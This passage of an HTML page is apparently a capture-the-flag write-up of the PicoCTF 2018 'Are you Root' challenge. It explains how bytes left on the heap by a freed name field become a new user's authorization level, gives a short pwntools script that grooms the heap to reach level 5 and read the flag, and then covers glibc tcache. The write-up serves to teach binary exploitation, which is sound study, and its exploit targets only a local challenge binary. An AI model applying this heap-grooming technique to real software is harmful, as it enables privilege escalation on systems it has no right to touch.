pzOyd1nyAEUr1fp1bsyoV++xmfzL2IGju4Pw1hzE31GtmfFwXXEFavRB+yzTUN6TH4Vx32T6PL2j0TdfvoO3y6xpM8pAGo8l06e5aB9AOk9nQk/eoKdHGfk29WoZA/BFtScTQZyIzi2MeJ2++cDStH47bk0eNYLnd+V2wel+702lAr/pWsnd85O7Ma0RVdRgSN7zTTs1wT3e5+D3NOsHDCZrBcVji4+JaEtRAHuWOM+xOyXv8Tv1hq3mkJUZuE/qN64SmSawhNuzijE5YVwUY091YC69qVxWXSAowvzv64YjOgul6esjjuC+0GpxG3ezLEvptD6v96snXcN1+bPUTPbj7X7M/L6U9eHWjZRbD0Qwe2MNIVz/EAkA7v4UN24jjhzoQ2UOF2F+vh4mzk74w+iC2nXkj6fuvMHVA0NBUUHqCoaCjrdPQsQhdZo6Mo2psvEwXT4Ty3KuerIiM2glJ1CdCmbQsdx72tDX6s2NfTRbPKLsuDdh0r8IV8WHCqyUIjHVn5waylEBZwnJNvSH1VRzaDcGwJohYe4ooD5Gr/2HsAPgfckU24y0SU8vdLid7F5+xg+79yeSot8eaLN05gPTsMvKb+Hha+h3qpRUVXQGy1bVXogmooKqOr9463oPt/5JTNms4p2vyNrYTW6CnRasYRhVY6wePxQDoekoLg3Z6DviL/OlO9yz2tD01ALOmAIIf6Wkk+jrCxyFEccnXTA3eFsCjxLSM6b1KtXiuhfArD4GPF3aSkcWPIb17e8xRstr1KmpcLxMXtJvBlQpqAAgnPepGGLyuiP5S07YKhCkxbe5Aac42IuQALxcSqO1argrttfgu8I/kqNPMf5aD3t33gJz7UbiClg1m1Zn/Pl/jmONp55/13YpZ2F1hhrUa9hKcLmzGb5xgt5s2UbV6KztCKC+54+3/y9N2ldA6NfMPdfSNLh3uwdOr+ow2/xWk7G/oNPuBBWKj+4FUe83AtAZwAAAqNJREFU6jxBjZz8b2rmZGJCr5NewA8WxhweTFiqG63/N4ST+iMkGDyoWiqY9b+EYI7ZwpJF3Vk4fDELnJewfkcICbl2lKnpRfI2Xw5dKfk/0hw/X9af7EKfBaNRdAeZ9nvi7XmpFr2F5ct6Mf/juUzKmcf2YB013h1Mn6eusLHDNuI0gET8tvqTM7Mvn45JZO2B65hd6+Opo+TXX3P8WT11Fy8tmsiSDTVY43uUy7E56J088OYcGzeHYbagz4UvYhST6SLB53J56Z3+vBPwI6cjM9A51cXTtngzZy1mK8uW9mLByAXM1M1j48Eosp3qU07HX0Pc2IAeiybSvRq0dwim4xh/WecW4h75wW3bghGHWtz1TS3lV4ZXGcW+4pxrS9vN/MErcZv8DhPW90OXFsm5ZRPZ+msIqVoGpye9T7+rQxnQ5wM+7VkGOzWN2FA/Vh1aW0JDuoc5gl++3ka3dR1h5Tj2J965HpDOiXE9GZ40lsFDpjOnjEZ84H6Wd57OsttXlKhELRvNxx4T+Kj3VOaOsUXNTOZGyHF2hmVYtLZvOZVo3+H0uNGDvsM60vvb7rjbK2TeuEKQ7+fs2BJGsmZJn0uIOZyf+gzDadogui74nmEuNpgzUkiODuDQ5eIcztPxH9+DIbGjGNDrE2aMKo0+O4UbIcf5/UL63c+hKZwTf16kQ2eFowfC+X88xSCE1VAa2Nco2ez5F9LV7MPygx3we6UjC07L/E0IYd3+H864PRxK6UrUfsIBxcmHjtMGUmbjKHzPSGgLIazfIxvchgZd+XzD+5Q3x3Du52kMHb2bpEf+vYUQ4nHwWCyVCCHEo0Ru4SeEEFZGglsIIayMBLcQQlgZCW4hhLAyEtxCCGFlJLiFEMLKSHALIYSVkeAWQggr83933ugPqmZSdgAAAABJRU5ErkJggg==" width="366" height="124" class="img_E7b_"></p><p>The authorization level is actually the decimal conversion of 4 &#x27;a&#x27;s. These &#x27;a&#x27;s are the ones that had remained on the heap after <code>user-&gt;name</code> had been free&#x27;d from the <code>reset</code> command.</p><p>We can manipulate the heap in a way so that the value <code>5</code> will be stored in the new user&#x27;s level from running <code>login</code>. I will have the first 8 bytes set as &#x27;a&#x27;s and the following byte to be 0x05.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Toast&#x27;s submission for the challenge &#x27;Are you Root&#x27;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">This script can be used in the following manner:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">python3 ./solve.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Returns:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    The flag to solve the challenge.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exe </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./auth&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./libc.so.6&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ld </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./ld-2.27.so&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">log_level </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;info&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">terminal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;gnome-terminal&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;-e&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&#x27;&#x27;&#x27;Establish the connection to the process, local or remote.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &#x27;&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    io </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> io</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&#x27;&#x27;&#x27;Return the flag.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &#x27;&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> get_flag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">get_flag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&#x27;&#x27;&#x27;Get the flag&#x27;&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> io</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;login aaaaaaaa&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\x05&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;&gt; &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;&gt; &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;reset&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;&gt; &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;login bob&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;&gt; &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;get-flag&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">success</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Flag found: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;__main__&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>This attack is successful because of how the glibc heap management works. Data that is freed will be stored in tcache if it meets size requirements and has space to store chunks. Tcache is the first place that is checked for memory allocation or placing free&#x27;d chunks. Tcache is meant to speed up performance because it is thread specific and does not require the bin to be locked for modification. If the program called a function pointer instead of checking an integer value, I would be able to call the <code>give_flag()</code> function directly.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="references">References<a class="hash-link" href="#references" title="Direct link to heading">​</a></h2><p><a href="https://sourceware.org/glibc/wiki/MallocInternals" target="_blank" rel="noopener noreferrer">Sourceware glibc Wiki</a></p></div><footer class="row docusaurus-mt-lg blogPostDetailsFull_h6_j"><div class="col"><b>Tags:</b><ul class="tags_XVD_ padding--none margin-left--sm"><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/blog/tags/pico-ctf-2018">PicoCTF 2018</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/blog/tags/binary-exploitation">Binary Exploitation</a></li><li class="tag_JSN8"><a class="tag_hD8n tagRegular_D6E_" href="/blog/tags/heap-grooming">Heap grooming</a></li></ul></div><div class="col margin-top--sm"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-03-01-are-you-root.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_dcUD" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/blog/level-1"><div class="pagination-nav__sublabel">Newer Post</div><div class="pagination-nav__label">Level 1</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/blog/baby-c"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">baby-c</div></a></div></nav></main><div class="col col--2"><div class="tableOfContents_cNA8 thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#the-challenge" class="table-of-contents__link toc-highlight">The Challenge</a></li><li><a href="#analysis" class="table-of-contents__link toc-highlight">Analysis</a></li><li><a href="#references" class="table-of-contents__link toc-highlight">References</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://twitter.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
<script src="/assets/js/runtime~main.adf85c56.js"></script>
<script src="/assets/js/main.9d7ce086.js"></script>
</body>
</html>